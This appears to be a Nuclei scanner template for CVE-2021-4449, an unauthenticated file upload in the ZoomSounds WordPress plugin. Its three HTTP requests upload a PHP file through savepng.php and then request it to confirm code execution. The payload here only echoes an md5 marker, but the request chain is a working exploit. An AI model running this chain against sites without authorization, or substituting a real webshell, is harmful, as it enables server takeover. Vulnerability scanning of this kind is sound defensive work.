flow: http(1) && http(2) && http(3)
http:
- matchers:
  - internal: true
    status:
    - 200
    type: status
  raw:
  - 'GET /wp-content/plugins/dzs-zoomsounds/savepng.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{rand_filename}}")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-content/plugins/dzs-zoomsounds/savepng.php?location={{rand_filename}}.php
    HTTP/1.1

    Host: {{Hostname}}


    <?php echo md5("{{string}}");?>

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{md5(string)}}")
    type: dsl
  raw:
  - 'GET /wp-content/plugins/dzs-zoomsounds/{{rand_filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-4449
info:
  author: 0xnemian
  classification:
    cpe: cpe:2.3:a:digitalzoomstudio:zoomsounds:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-4449
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98989
    epss-score: 0.78635
  description: 'ZoomSounds plugin for WordPress contains a file upload vulnerability
    in savepng.php

    '
  impact: 'Unauthenticated attackers can upload arbitrary PHP files via savepng.php
    without authentication or validation, achieving remote code execution and complete
    server compromise.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/dzs-zoomsounds/"
    framework: wordpress
    max-request: 3
    product: zoomsounds
    vendor: digitalzoomstudio
    verified: true
  name: ZoomSounds Plugin - Unauthenticated Arbitrary File Upload
  reference:
  - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
  - https://codecanyon.net/item/zoomsounds-wordpress-wave-audio-player-with-playlist/6181433
  - https://github.com/0xAgun/Arbitrary-File-Upload-ZoomSounds
  - https://ithemes.com/blog/wordpress-vulnerability-report-june-2021-part-5/#ib-toc-anchor-2
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/262e3bb3-bc83-4d0b-8056-9f94ec141b8f?source=cve
  remediation: 'Upgrade to ZoomSounds plugin version that addresses the file upload
    vulnerability.

    '
  severity: critical
  tags: cve,cve2021,wpscan,wp,zoomsounds,intrusive,file-upload,vkev
variables:
  rand_filename: '{{to_lower(rand_base(8))}}'
  string: CVE-2021-4449
